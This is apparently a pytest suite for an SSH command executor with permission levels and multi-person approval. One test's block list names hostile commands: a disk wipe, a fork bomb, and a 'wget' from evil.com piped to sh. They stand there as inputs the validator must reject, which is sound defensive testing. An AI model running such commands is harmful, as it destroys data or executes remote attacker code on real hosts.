#!/usr/bin/env python3
"""
Tests for AALS Module 8: SSH Executor
セキュアなリモートコマンド実行・自動化モジュールのテスト
"""

import pytest
import asyncio
from datetime import datetime, timedelta
from unittest.mock import Mock, AsyncMock, patch, MagicMock
from typing import List, Dict, Any

from aals.modules.ssh_executor import (
    SSHExecutor,
    SSHTarget,
    CommandRequest,
    CommandResult,
    ApprovalRequest,
    ExecutionReport,
    PermissionLevel,
    ApprovalStatus,
    ExecutionStatus,
    CommandValidator,
    SSHConnectionPool
)


class TestCommandValidator:
    """コマンドバリデーターテスト"""
    
    def test_validate_read_only_commands(self):
        """READ_ONLYコマンドバリデーションテスト"""
        # 許可されるコマンド
        valid_commands = [
            "ls -la",
            "pwd",
            "hostname",
            "df -h",
            "free -m",
            "ps aux",
            "netstat -an"
        ]
        
        for cmd in valid_commands:
            is_valid, error = CommandValidator.validate_command(cmd, PermissionLevel.READ_ONLY)
            assert is_valid is True, f"Command should be valid: {cmd}, Error: {error}"
    
    def test_validate_forbidden_commands(self):
        """禁止コマンドテスト"""
        forbidden_commands = [
            "rm -rf /",
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda1",
            "shutdown -h now",
            "reboot",
            ":(){ :|:& };:",  # Fork bomb
            "wget http://evil.com/script.sh | sh"
        ]
        
        for cmd in forbidden_commands:
            is_valid, error = CommandValidator.validate_command(cmd, PermissionLevel.CRITICAL)
            assert is_valid is False, f"Command should be forbidden: {cmd}"
            assert "Forbidden command pattern" in error
    
    def test_validate_permission_levels(self):
        """権限レベル別バリデーションテスト"""
        # MEDIUM_RISKコマンド
        medium_cmd = "systemctl restart myapp_dev"
        
        # MEDIUM_RISK以上では許可
        is_valid, _ = CommandValidator.validate_command(medium_cmd, PermissionLevel.MEDIUM_RISK)
        assert is_valid is True
        
        # READ_ONLYでは拒否
        is_valid, error = CommandValidator.validate_command(medium_cmd, PermissionLevel.READ_ONLY)
        assert is_valid is False
        assert "not allowed" in error.lower()
    
    def test_sanitize_command(self):
        """コマンドサニタイズテスト"""
        dangerous_cmd = "ls; rm -rf /tmp"
        sanitized = CommandValidator.sanitize_command(dangerous_cmd)
        assert "\\;" in sanitized
        
        # grepパイプは許可
        pipe_cmd = "ps aux | grep nginx"
        sanitized = CommandValidator.sanitize_command(pipe_cmd)
        assert "|" in sanitized  # grepパイプは保持
    
    def test_empty_command_validation(self):
        """空コマンドバリデーションテスト"""
        is_valid, error = CommandValidator.validate_command("", PermissionLevel.READ_ONLY)
        assert is_valid is False
        assert "Empty command" in error


class TestSSHTarget:
    """SSH接続先テスト"""
    
    def test_ssh_target_creation(self):
        """SSH Target作成テスト"""
        target = SSHTarget(
            host="test.example.com",
            port=2222,
            username="testuser",
            environment="staging",
            tags={"role": "web", "team": "backend"}
        )
        
        assert target.host == "test.example.com"
        assert target.port == 2222
        assert target.username == "testuser"
        assert target.environment == "staging"
        assert target.tags["role"] == "web"
    
    def test_ssh_target_to_dict(self):
        """SSH Target辞書変換テスト"""
        target = SSHTarget(
            host="test.example.com",
            username="testuser",
            environment="production"
        )
        
        data = target.to_dict()
        assert isinstance(data, dict)
        assert data["host"] == "test.example.com"
        assert data["username"] == "testuser"
        assert data["environment"] == "production"


class TestCommandRequest:
    """コマンドリクエストテスト"""
    
    def test_command_request_creation(self):
        """コマンドリクエスト作成テスト"""
        targets = [SSHTarget(host="test1.com"), SSHTarget(host="test2.com")]
        
        request = CommandRequest(
            command="ls -la",
            targets=targets,
            permission_level=PermissionLevel.READ_ONLY,
            requested_by="test_user",
            correlation_id="corr_123"
        )
        
        assert request.command == "ls -la"
        assert len(request.targets) == 2
        assert request.permission_level == PermissionLevel.READ_ONLY
        assert request.requested_by == "test_user"
        assert request.correlation_id == "corr_123"
        assert request.request_id  # UUIDが生成される
    
    def test_command_request_to_dict(self):
        """コマンドリクエスト辞書変換テスト"""
        target = SSHTarget(host="test.com")
        request = CommandRequest(
            command="pwd",
            targets=[target],
            permission_level=PermissionLevel.LOW_RISK
        )
        
        data = request.to_dict()
        assert isinstance(data, dict)
        assert data["command"] == "pwd"
        assert data["permission_level"] == "low_risk"
        assert len(data["targets"]) == 1


class TestApprovalRequest:
    """承認リクエストテスト"""
    
    def test_approval_request_creation(self):
        """承認リクエスト作成テスト"""
        command_request = CommandRequest(command="ls", targets=[])
        
        approval = ApprovalRequest(
            command_request=command_request,
            required_approvers=["alice", "bob"],
            expiry_time=datetime.now() + timedelta(hours=1)
        )
        
        assert approval.command_request == command_request
        assert len(approval.required_approvers) == 2
        assert approval.approval_status == ApprovalStatus.PENDING
        assert not approval.is_approved()
        assert not approval.is_expired()
    
    def test_approval_process(self):
        """承認プロセステスト"""
        approval = ApprovalRequest(
            required_approvers=["alice", "bob"]
        )
        
        # 1人目の承認
        approval.approvals["alice"] = {"decision": True, "timestamp": datetime.now().isoformat()}
        assert not approval.is_approved()  # まだ不十分
        
        # 2人目の承認
        approval.approvals["bob"] = {"decision": True, "timestamp": datetime.now().isoformat()}
        approval.approval_status = ApprovalStatus.APPROVED
        assert approval.is_approved()  # 承認完了
    
    def test_auto_approval(self):
        """自動承認テスト"""
        approval = ApprovalRequest(
            approval_status=ApprovalStatus.AUTO_APPROVED
        )
        
        assert approval.is_approved()
    
    def test_approval_expiry(self):
        """承認期限テスト"""
        approval = ApprovalRequest(
            expiry_time=datetime.now() - timedelta(minutes=1)  # 1分前に期限切れ
        )
        
        assert approval.is_expired()


class TestCommandResult:
    """コマンド実行結果テスト"""
    
    def test_command_result_creation(self):
        """コマンド実行結果作成テスト"""
        target = SSHTarget(host="test.com")
        
        result = CommandResult(
            request_id="req_123",
            target=target,
            command="ls -la",
            exit_code=0,
            stdout="total 1024\ndrwxr-xr-x 2 user user 4096 Jan 1 12:00 .",
            stderr="",
            execution_time=1.5,
            status=ExecutionStatus.COMPLETED
        )
        
        assert result.request_id == "req_123"
        assert result.target == target
        assert result.exit_code == 0
        assert result.status == ExecutionStatus.COMPLETED
        assert result.execution_time == 1.5
    
    def test_command_result_to_dict(self):
        """コマンド実行結果辞書変換テスト"""
        target = SSHTarget(host="test.com")
        result = CommandResult(
            request_id="req_123",
            target=target,
            command="pwd",
            exit_code=0,
            stdout="/home/user",
            stderr="",
            execution_time=0.1,
            status=ExecutionStatus.COMPLETED
        )
        
        data = result.to_dict()
        assert isinstance(data, dict)
        assert data["request_id"] == "req_123"
        assert data["exit_code"] == 0
        assert data["status"] == "completed"
        assert data["execution_time"] == 0.1
    
    def test_long_output_truncation(self):
        """長い出力の切り詰めテスト"""
        target = SSHTarget(host="test.com")
        long_output = "x" * 2000  # 2000文字の出力
        
        result = CommandResult(
            request_id="req_123",
            target=target,
            command="test",
            exit_code=0,
            stdout=long_output,
            stderr="",
            execution_time=0.1,
            status=ExecutionStatus.COMPLETED
        )
        
        data = result.to_dict()
        assert len(data["stdout"]) == 1000  # 1000文字に切り詰め


class TestSSHExecutor:
    """SSH Executor基本テスト"""
    
    @pytest.fixture
    def mock_config(self):
        """モック設定"""
        config = Mock()
        config.enabled = True
        config.config = {
            "connection_pool_size": 5,
            "approval_required": {
                "read_only": [],
                "low_risk": [],
                "medium_risk": ["sre-team"],
                "high_risk": ["sre-team", "team-lead"],
                "critical": ["sre-team", "team-lead", "on-call"]
            },
            "auto_approve_patterns": {
                "read_only": ["^ls", "^pwd"],
                "low_risk": ["^systemctl status"]
            },
            "approval_timeout_minutes": 30,
            "max_parallel_executions": 3,
            "default_timeout_seconds": 300
        }
        return config
    
    @pytest.fixture
    def executor(self, mock_config):
        """SSH Executorインスタンス"""
        with patch('aals.modules.ssh_executor.get_config_manager') as mock_config_manager:
            mock_config_manager.return_value.get_module_config.return_value = mock_config
            
            executor = SSHExecutor()
            return executor
    
    def test_initialization(self, executor):
        """初期化テスト"""
        assert executor.max_parallel_executions == 3
        assert executor.default_timeout == 300
        assert executor.approval_timeout_minutes == 30
        assert isinstance(executor.pending_approvals, dict)
        assert isinstance(executor.running_tasks, dict)
    
    @pytest.mark.asyncio
    async def test_verify_setup_success(self, executor):
        """セットアップ確認成功テスト"""
        result = await executor.verify_setup()
        assert result is True
    
    @pytest.mark.asyncio
    async def test_verify_setup_disabled(self, executor):
        """セットアップ確認無効テスト"""
        executor.config.enabled = False
        result = await executor.verify_setup()
        assert result is False
    
    def test_get_required_approvers(self, executor):
        """必要承認者取得テスト"""
        command_request = CommandRequest(
            command="systemctl restart app",
            targets=[SSHTarget(host="prod.com", environment="production")],
            permission_level=PermissionLevel.MEDIUM_RISK
        )
        
        approvers = executor._get_required_approvers(command_request)
        assert "sre-team" in approvers
    
    def test_check_auto_approval_read_only(self, executor):
        """READ_ONLY自動承認テスト"""
        command_request = CommandRequest(
            command="ls -la",
            targets=[],
            permission_level=PermissionLevel.READ_ONLY
        )
        
        result = executor._check_auto_approval(command_request)
        assert result is True
    
    def test_check_auto_approval_dry_run(self, executor):
        """dry-run自動承認テスト"""
        command_request = CommandRequest(
            command="rm -rf /tmp/*",
            targets=[],
            permission_level=PermissionLevel.HIGH_RISK,
            dry_run=True
        )
        
        result = executor._check_auto_approval(command_request)
        assert result is True
    
    def test_check_auto_approval_pattern_match(self, executor):
        """パターンマッチ自動承認テスト"""
        command_request = CommandRequest(
            command="systemctl status nginx",
            targets=[],
            permission_level=PermissionLevel.LOW_RISK
        )
        
        result = executor._check_auto_approval(command_request)
        assert result is True
    
    def test_create_approval_request(self, executor):
        """承認リクエスト作成テスト"""
        command_request = CommandRequest(
            command="ls",
            targets=[SSHTarget(host="test.com")],
            permission_level=PermissionLevel.READ_ONLY
        )
        
        approval = executor.create_approval_request(command_request)
        
        assert isinstance(approval, ApprovalRequest)
        assert approval.command_request == command_request
        assert approval.approval_status == ApprovalStatus.AUTO_APPROVED  # READ_ONLYは自動承認
    
    @pytest.mark.asyncio
    async def test_submit_request_valid(self, executor):
        """有効リクエスト送信テスト"""
        command_request = CommandRequest(
            command="ls -la",
            targets=[SSHTarget(host="test.com")],
            permission_level=PermissionLevel.READ_ONLY
        )
        
        approval = await executor.submit_request(command_request)
        
        assert isinstance(approval, ApprovalRequest)
        assert approval.approval_id in executor.pending_approvals
    
    @pytest.mark.asyncio
    async def test_submit_request_invalid_command(self, executor):
        """無効コマンドリクエスト送信テスト"""
        command_request = CommandRequest(
            command="rm -rf /",
            targets=[SSHTarget(host="test.com")],
            permission_level=PermissionLevel.READ_ONLY
        )
        
        with pytest.raises(ValueError) as exc_info:
            await executor.submit_request(command_request)
        
        assert "Invalid command" in str(exc_info.value)
    
    def test_approve_request_success(self, executor):
        """承認成功テスト"""
        # 承認待ちリクエストを追加
        approval = ApprovalRequest(
            required_approvers=["alice"],
            expiry_time=datetime.now() + timedelta(hours=1)
        )
        executor.pending_approvals[approval.approval_id] = approval
        
        # 承認実行
        result = asyncio.run(executor.approve_request(approval.approval_id, "alice", True))
        
        assert result is True
        assert approval.approval_status == ApprovalStatus.APPROVED
        assert "alice" in approval.approvals
    
    def test_approve_request_rejection(self, executor):
        """承認拒否テスト"""
        approval = ApprovalRequest(
            required_approvers=["alice"],
            expiry_time=datetime.now() + timedelta(hours=1)
        )
        executor.pending_approvals[approval.approval_id] = approval
        
        # 拒否実行
        result = asyncio.run(executor.approve_request(approval.approval_id, "alice", False))
        
        assert result is True
        assert approval.approval_status == ApprovalStatus.REJECTED
    
    def test_approve_request_not_found(self, executor):
        """存在しない承認リクエストテスト"""
        result = asyncio.run(executor.approve_request("nonexistent", "alice", True))
        assert result is False
    
    def test_approve_request_expired(self, executor):
        """期限切れ承認リクエストテスト"""
        approval = ApprovalRequest(
            required_approvers=["alice"],
            expiry_time=datetime.now() - timedelta(minutes=1)  # 期限切れ
        )
        executor.pending_approvals[approval.approval_id] = approval
        
        result = asyncio.run(executor.approve_request(approval.approval_id, "alice", True))
        
        assert result is False
        assert approval.approval_status == ApprovalStatus.EXPIRED
    
    def test_get_pending_approvals(self, executor):
        """承認待ちリスト取得テスト"""
        # 有効な承認リクエスト
        approval1 = ApprovalRequest(expiry_time=datetime.now() + timedelta(hours=1))
        executor.pending_approvals[approval1.approval_id] = approval1
        
        # 期限切れの承認リクエスト
        approval2 = ApprovalRequest(expiry_time=datetime.now() - timedelta(minutes=1))
        executor.pending_approvals[approval2.approval_id] = approval2
        
        pending = executor.get_pending_approvals()
        
        assert len(pending) == 1
        assert pending[0] == approval1
        assert approval2.approval_id not in executor.pending_approvals  # 期限切れは削除される
    
    def test_get_approval_status(self, executor):
        """承認ステータス取得テスト"""
        approval = ApprovalRequest()
        executor.pending_approvals[approval.approval_id] = approval
        
        result = executor.get_approval_status(approval.approval_id)
        assert result == approval
        
        result = executor.get_approval_status("nonexistent")
        assert result is None


class TestSSHConnectionPool:
    """SSH接続プールテスト"""
    
    def test_connection_pool_initialization(self):
        """接続プール初期化テスト"""
        pool = SSHConnectionPool(max_connections=5, connection_timeout=10)
        
        assert pool.max_connections == 5
        assert pool.connection_timeout == 10
        assert isinstance(pool._connections, dict)
        assert isinstance(pool._locks, dict)
    
    def test_get_connection_id(self):
        """接続ID生成テスト"""
        pool = SSHConnectionPool()
        target = SSHTarget(host="test.com", port=2222, username="testuser")
        
        conn_id = pool._get_connection_id(target)
        assert conn_id == "testuser@test.com:2222"
    
    @pytest.mark.asyncio
    async def test_start_stop(self):
        """開始・停止テスト"""
        pool = SSHConnectionPool()
        
        await pool.start()
        assert pool._cleanup_task is not None
        assert not pool._cleanup_task.done()
        
        await pool.stop()
        assert pool._cleanup_task.cancelled() or pool._cleanup_task.done()


class TestExecutionReport:
    """実行レポートテスト"""
    
    def test_execution_report_creation(self):
        """実行レポート作成テスト"""
        command_request = CommandRequest(command="test", targets=[])
        target = SSHTarget(host="test.com")
        
        results = [
            CommandResult(
                request_id="req1",
                target=target,
                command="test",
                exit_code=0,
                stdout="success",
                stderr="",
                execution_time=1.0,
                status=ExecutionStatus.COMPLETED
            ),
            CommandResult(
                request_id="req1",
                target=target,
                command="test",
                exit_code=1,
                stdout="",
                stderr="error",
                execution_time=0.5,
                status=ExecutionStatus.FAILED
            )
        ]
        
        report = ExecutionReport(
            request_id="req1",
            command_request=command_request,
            approval_request=None,
            results=results,
            overall_status=ExecutionStatus.FAILED,
            total_execution_time=1.5
        )
        
        assert report.request_id == "req1"
        assert len(report.results) == 2
        assert report.overall_status == ExecutionStatus.FAILED
        assert report.total_execution_time == 1.5
    
    def test_execution_report_to_dict(self):
        """実行レポート辞書変換テスト"""
        command_request = CommandRequest(command="test", targets=[])
        target = SSHTarget(host="test.com")
        
        results = [
            CommandResult(
                request_id="req1",
                target=target,
                command="test",
                exit_code=0,
                stdout="ok",
                stderr="",
                execution_time=1.0,
                status=ExecutionStatus.COMPLETED
            )
        ]
        
        report = ExecutionReport(
            request_id="req1",
            command_request=command_request,
            approval_request=None,
            results=results,
            overall_status=ExecutionStatus.COMPLETED,
            total_execution_time=1.0
        )
        
        data = report.to_dict()
        assert isinstance(data, dict)
        assert data["request_id"] == "req1"
        assert data["overall_status"] == "completed"
        assert data["success_rate"] == 1.0  # 100%成功
        assert data["total_execution_time"] == 1.0


class TestIntegrationScenarios:
    """統合シナリオテスト"""
    
    @pytest.fixture
    def mock_config(self):
        """モック設定"""
        config = Mock()
        config.enabled = True
        config.config = {
            "connection_pool_size": 2,
            "approval_required": {
                "read_only": [],
                "medium_risk": ["sre-team"]
            },
            "auto_approve_patterns": {},
            "approval_timeout_minutes": 30,
            "max_parallel_executions": 2,
            "default_timeout_seconds": 60
        }
        return config
    
    @pytest.fixture
    def executor(self, mock_config):
        """SSH Executorインスタンス"""
        with patch('aals.modules.ssh_executor.get_config_manager') as mock_config_manager:
            mock_config_manager.return_value.get_module_config.return_value = mock_config
            executor = SSHExecutor()
            return executor
    
    @pytest.mark.asyncio
    async def test_read_only_command_workflow(self, executor):
        """READ_ONLYコマンドワークフローテスト"""
        targets = [SSHTarget(host="test1.com"), SSHTarget(host="test2.com")]
        
        # コマンド実行リクエスト
        report = await executor.execute_command(
            command="ls -la",
            targets=targets,
            permission_level=PermissionLevel.READ_ONLY,
            dry_run=True,
            requested_by="test_user"
        )
        
        assert isinstance(report, ExecutionReport)
        assert report.approval_request.approval_status == ApprovalStatus.AUTO_APPROVED
    
    @pytest.mark.asyncio
    async def test_medium_risk_approval_workflow(self, executor):
        """MEDIUM_RISK承認ワークフローテスト"""
        targets = [SSHTarget(host="prod.com", environment="production")]
        
        # 承認が必要なコマンド（MEDIUM_RISKパターンに一致）
        report = await executor.execute_command(
            command="systemctl restart myapp_dev",
            targets=targets,
            permission_level=PermissionLevel.MEDIUM_RISK,
            requested_by="developer"
        )
        
        assert isinstance(report, ExecutionReport)
        assert report.approval_request.approval_status == ApprovalStatus.PENDING
        assert report.overall_status == ExecutionStatus.QUEUED


if __name__ == "__main__":
    pytest.main([__file__, "-v"])